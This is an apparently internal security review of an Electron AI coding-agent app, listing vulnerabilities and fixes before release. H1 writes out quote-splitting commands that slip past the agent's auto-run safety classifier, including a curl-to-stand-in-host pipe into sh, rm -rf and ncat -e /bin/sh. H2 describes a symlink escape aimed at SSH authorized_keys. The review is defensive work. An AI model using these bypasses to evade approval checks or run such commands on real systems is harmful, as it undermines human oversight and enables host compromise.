# Copse — Pre-General-Release Security Review

**Scope:** Full-codebase review of the Copse Electron app ahead of general release.
Seven parallel audits covered: Electron process hardening, the IPC surface, the
shell-execution/approval boundary, filesystem/path containment, dynamic code
loading (custom tools / MCP / plugins / install), renderer XSS & web content, and
secrets/network egress.

**Overall:** The architecture is security-conscious and many boundaries are
genuinely well built (narrow `contextBridge`, main-frame IPC gating, path
containment for the common cases, secret scrubbing for child processes, strict
DOMPurify + mermaid `strict`, MCP project-config trust gating). However, there are
**two confirmed High-severity issues** and a **structural High** in the
command-execution boundary that should be addressed before GA, plus a cluster of
Mediums. Findings below are de-duplicated across the seven audits and ordered by
severity. The two headline items were re-verified by hand against the source.

---

## High severity

### H1 — Command auto-run classifier is bypassable; on Linux/Windows that means silent host RCE

**Files:** `src/main/services/shell-scope.ts` (`normalizeShellCommandForAnalysis` :81, pattern lists :46–56, `analyzeShellCommand`), `src/main/services/permission-policy.ts:78`, `src/main/project-sandbox/spawn.ts:106`

The decision to auto-run an agent-proposed shell command without human approval is
made by regex matching over the **raw, un-lexed** command string. The only
de-obfuscation applied is backslash removal. Multiple trivial bypasses were
verified empirically:

- **Quote-splitting:** `r""m -rf .`, `c""url http://evil | s""h`, `p""ython3 -c …` — the shell collapses the empty quotes; the `\b`-anchored patterns do not match, so the command is classified "safe / sandbox".
- **Interpreter execution of agent-written files:** `node ./x.js`, `bash x.sh`, `ruby -e …`, `perl -e …`, `python <<EOF…EOF` are not in the inline-exec list. The agent can `write_file` a malicious script (looks benign at approval) then auto-run it; the classifier sees only `node ./x.js`.
- **git tricks:** `git -c protocol.ext.allow=always clone ext::sh -c '…'` and `git submodule update` evade the `\bgit\s+(push|pull|…)\b` detector.
- **`ncat -e /bin/sh …`** evades `\bnc\b`.

On **macOS**, seatbelt contains most of this (but not in-workspace destruction —
`r""m -rf` still wipes the repo — nor the network egress in M6). On
**Linux/Windows there is no OS sandbox at all** (`spawn.ts` gates the sandbox on
`darwin`); the boundary is this regex plus an _optional_ local LLM classifier. If a
user has the local safety model enabled (a documented, supported config), any of
the above bypasses becomes **unprompted host code execution**.

**Fix:** Stop matching regexes against an un-lexed string. Tokenize with a real
shell parser (`shell-quote` is already a dependency) and classify resolved command
words. Treat "interpreter runs a file/stdin/heredoc" as never-auto-run. On
platforms with no OS sandbox, do not let the LLM _upgrade_ a command to auto-run
unless it is on an explicit read-only/build allowlist.

### H2 — Write/rename/delete through a dangling symlink escapes the workspace

**Files:** `src/main/services/workspace.ts:102` (`resolveThroughExistingPrefix`), `src/main/services/diff-queue.ts:312`/`352`/`332` (raw `fs` writes); same pattern in the write/str-replace tools.

`resolveThroughExistingPrefix` walks up the path with `existsSync`, which _follows_
symlinks — so a **dangling** symlink (target absent) returns `false`, is treated as
a normal non-existent leaf, and its parent realpaths to inside the workspace. The
path passes every `isPathInsideRoot` check, then `fsp.writeFile`/`rename` follows
the symlink and writes to the outside target. There is no `lstat`/`O_NOFOLLOW`
guard. Verified empirically on Node 22.

**Exploit:** a cloned repo ships a checked-in dangling symlink
`deploy.conf -> ../../../../home/<user>/.ssh/authorized_keys`. The user opens the
folder and asks the agent to edit `deploy.conf`; the write lands on
`authorized_keys` outside the workspace → key injection / RCE. Trust state is
irrelevant — file tools never consult it. Note the agent file-tool path uses raw
`node:fs` and is **not** routed through the macOS seatbelt gateway (that gateway is
wired only for the renderer `fs:*` IPC), so this works on macOS too.

**Fix:** Before any write/rename/delete, `realpath` the parent and `lstat` the leaf
(or open `O_NOFOLLOW`); reject if the final component is a symlink leaving the root.
Apply in `applyWrite`/`applyRename` (both endpoints)/`applyDelete` and the tools.

### H3 — `settings:get` IPC returns raw stored API-key records to the renderer

**Files:** `src/main/ipc/register-handlers.ts:180`, `src/main/services/settings.ts:90,124`

`settings:get` accepts any key ≤128 chars with **no allowlist and no
`assertMainFrameSender`**, and returns `getSetting(k, null)` → `store.get(key)` from
the same store where keys live under `apiKey.${provider}`. So
`window.api.settings.get('apiKey.anthropic')` returns the `StoredKey` record. When
the OS keyring is unavailable (common on Linux), that record's `enc` is **base64
plaintext** (`plain:true`), recovered directly. The deliberately boolean-only
`settings:getKey` handler exists precisely to avoid this; the read path defeats it.
Contrast `settings:set`, which correctly enforces `isRendererWritableSettingKey`.

**Fix:** Add a read allowlist to `settings:get` rejecting `apiKey.*` (ideally
restrict to known-readable keys), and add `assertMainFrameSender`. Never return raw
`apiKey.*` records.

---

## Medium severity

### M1 — Custom-tool `requiresApproval: true` flag is silently ignored

`src/main/services/permission-gate.ts:182`, `custom-tools-config.ts:123`. The flag
is documented and normalized onto the tool but **never read**. A tool that opts into
always-prompt auto-executes after a single "remember." Honor the flag (bypass the
remembered-grant when `requiresApproval === true`) or remove it from the
type/docs so it isn't a false promise.

### M2 — `sfw` (Socket Firewall) bootstrap install is unpinned and unscanned

`src/main/services/socket-firewall.ts:41`. The malware-scanner bootstrap runs
`npm install -g sfw` with no version pin, no integrity check, and **lifecycle
scripts enabled** — the one install that protects all others is itself unprotected
and a plausible typosquat target. Pin an exact version, pass `--ignore-scripts`,
verify integrity.

### M3 — Cursor project hooks: full-privilege shell on the agent hot path, fail-open

`src/main/services/cursor-hooks.ts:136`, `permission-gate.ts:330`. When enabled
(off by default) + workspace trusted, a repo's `.cursor/hooks.json` commands spawn
with `shell:true` outside the sandbox with cloud tool tokens in env, and a
crashed/slow/timed-out hook is treated as **allow**. Surface project hook commands
in the trust prompt; consider a separate opt-in for project (vs user) hooks.

### M4 — `remoteAgentBaseUrl` is renderer-writable and unvalidated; the Cursor key is sent to it

`src/main/services/settings-writable.ts:46`, `remote-agent-client.ts:156`. Only a
length check — no scheme/host validation — yet the Cursor credential is sent as
`Authorization` to `joinUrl(baseUrl, …)`. `http://attacker` (cleartext) or any
HTTPS host is accepted, unlike the hardcoded provider base URLs. Require `https:`
(allow `http:` only for loopback), reject userinfo, constrain/allowlist hosts.

### M5 — ACP external-agent spawn inherits the full unscrubbed `process.env`

`src/main/services/acp/acp-client.ts:63` uses `env: { ...process.env, ...config.env }`,
unlike every other subprocess sink which routes through
`envForRendererChildProcess()`. Hands all cloud keys to a third-party CLI. Currently
**latent** (no production caller wires a config yet), but fix before the path ships:
base env from `envForRendererChildProcess()`, overlay only the needed provider key.

### M6 — Auto-run "sandbox-contained" macOS commands still get network egress

`src/main/project-sandbox/config.ts:93` / `web-origins.ts:4`. The seatbelt network
policy applied to _every_ sandboxed spawn (including auto-run) allows
`*.duckduckgo.com` and **all of localhost on any port** with `allowLocalBinding`,
while the classifier/system-prompt claims "Network: denied." A contained auto-run
command can exfiltrate to a local listener or DDG subdomain with no prompt. Use an
empty allowlist + `allowLocalBinding:false` for the auto-run path; widen only for
explicitly-approved commands.

### M7 — In-app browser `<webview>` can navigate itself to `file://`

`src/main/windows/web-contents-lockdown.ts:38`, `browser-web-contents.ts`. The
browser guest is correctly isolated (no node/preload, separate session,
`webSecurity:true`) but has no navigation allowlist and `file:` is not blocked, so a
hostile page/redirect can render local files in the guest. Add a
`will-navigate`/`will-redirect` allowlist (`http(s)`/`about:blank` only).

### M8 — fs-watch path is not re-validated against symlink swaps (TOCTOU)

`src/main/ipc/fs-watcher.ts:12`, and the diff-queue write race (`diff-queue.ts:324`
does `mkdir` then `writeFile` after the string-based check). Same root cause as H2;
fd-based, symlink-refusing operations close both.

---

## Low severity

- **L1 — API keys stored as base64 plaintext when the OS keyring is unavailable** (`settings.ts:82`). By-design with a console warning and `isApiKeyEncrypted()` UI hint; consider session-only storage or an explicit opt-in, and make the UI warning prominent for GA.
- **L2 — Remote-artifact `<img>` feature is dead** (sanitizer strips it) — fail-safe today but brittle: a future "fix" that allowlists `img`/`src` without a scoped hook becomes live XSS. Decide: remove it, or make it work _and_ safe with a DOMPurify hook + regression test. (`sanitize.ts:15`, `renderer.ts:154`)
- **L3 — Streaming "pending" markdown line bypasses DOMPurify** (`streaming.ts:227`). Not exploitable as written (prose escaped, links https-only) but it's the lone exception to the sanitize-before-innerHTML invariant. Wrap it in `sanitizeRenderedMarkdown`.
- **L4 — Several IPC handlers lack frame check / validation:** `mcp:setEnabled` et al. (`register-handlers.ts:294`), `lmstudio:*` accept an unvalidated outbound `url` (SSRF read primitive against loopback/LAN, `index.ts:117`), `agent:*` `JSON.parse(...) as T` with no schema (`index.ts:185,228`), `agent:*` writes `llm-history:${threadId}` with an unvalidated threadId. Add `assertMainFrameSender` + zod parsing for consistency.
- **L5 — Build-time fetch-and-exec without integrity pinning:** `fetch-codesearch.mts` downloads, `chmod 0755`, and executes a third-party binary with no SHA-256/signature; `postinstall-native.mts` runs unpinned `npx electron-rebuild`; bundled cursor skills are fetched (commit-pinned) but injected as **trusted** prompt with no content hash. Add per-asset checksums; reconsider `trusted` status for fetched third-party skills.
- **L6 — `shell-scope` workspace-root prefix match** uses `startsWith(root)` without a trailing separator, so `/srv/project-secrets` counts as inside `/srv/project` (`shell-scope.ts:140`). Compare against `root + sep`.
- **L7 — `git:fileDiff` blob path** isn't validated against the workspace boundary the way the working-tree path is (`register-handlers.ts:252`); git pathspecs largely self-contain it, but normalize for consistency.
- **L8 — `style-src 'unsafe-inline'` in CSP** (`index.html:23`) retained for Monaco/mermaid; `img-src` excludes remote URLs so CSS-exfil is mitigated. Sandbox mermaid in an iframe with stricter CSP as a hardening goal.

---

## Notable strengths (keep these)

- Narrow, typed `contextBridge` — no generic `ipcRenderer`/`fs`/`shell`/`require` exposed; webPreferences hardened (`contextIsolation`, `sandbox`, `nodeIntegration:false`); `will-attach-webview` overrides guest prefs in main.
- `assertMainFrameSender` on the sensitive write/privilege IPC handlers; terminal handlers take no renderer command/env/cwd and are ownership-checked.
- Path containment (`resolveWorkspacePath`) defeats `..`, absolute paths, and _existing_ symlinks (the dangling case H2 is the gap); `~` not expanded; @-mention resolver index-bound.
- Displayed approval command == executed command (single parse, `textContent` render, no truncation/TOCTOU); unsandboxed-retry signal is forge-proof; subprocess secret scrubbing (`envForRendererChildProcess`) applied consistently across shell/terminal/MCP/hooks.
- MCP project configs never spawn in an untrusted workspace and get an empty env allowlist (no `${env:SECRET}` exfil); user/global configs win name collisions; untrusted schemas depth/`$ref`-sanitized.
- Strict DOMPurify allowlist at every markdown sink; mermaid `securityLevel:'strict'`; untrusted web content stays in the isolated guest; no API key ever returned to the renderer via the intended `getKey` path; provider base URLs hardcoded so a key can't be redirected to an attacker endpoint (except M4).
- SSRF controls on browser + fetch (private/link-local/metadata/CGNAT blocked, redirect re-validation, size caps).

---

## Recommendation for GA

Address **H1, H2, H3 before release** — H1 and H2 are agent/prompt-injection-reachable
code-exec/escape on the default Linux/Windows configuration, and H3 is a trivially
reachable credential exposure. The Medium cluster (especially M1, M2, M6) should
follow shortly after. The Lows are hardening that can be scheduled. The underlying
architecture is sound; these are fixable without structural change — H1 by
tokenizing instead of regex-matching, H2/M8 by fd-based symlink-refusing writes, H3
by a read allowlist.
